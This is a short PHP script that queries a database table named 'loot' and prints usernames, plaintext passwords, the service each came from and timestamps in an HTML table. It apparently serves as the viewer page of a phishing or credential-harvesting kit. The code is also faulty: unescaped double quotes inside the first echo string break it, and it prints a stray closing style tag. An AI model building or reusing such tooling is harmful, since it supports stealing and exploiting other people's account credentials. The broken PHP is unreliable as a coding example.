<?php
require("dbcfg.php");

// Fetch data from the database
$sql = "SELECT * FROM loot";
$result = $conn->query($sql);

// Display data in an HTML table
if ($result->num_rows > 0) {
    echo "<link rel="stylesheet" href="displaystyle.css"><table border='1'><tr><th>ID</th><th>User ID</th><th>Password</th><th>Service Used</th><th>Date/Time Stamp</th></tr>";

    while($row = $result->fetch_assoc()) {
        echo "<tr><td>" . $row["id"] . "</td><td>" . $row["username"] . "</td><td>" . $row["password"] . "</td><td>" . $row["service"] . "</td><td>" . $row["datetimestamp"] . "</td></tr>";
    }

    echo "</table>";
  	echo "</style>";
} else {
    echo "0 results";
}

// Close connection
$conn->close();
?>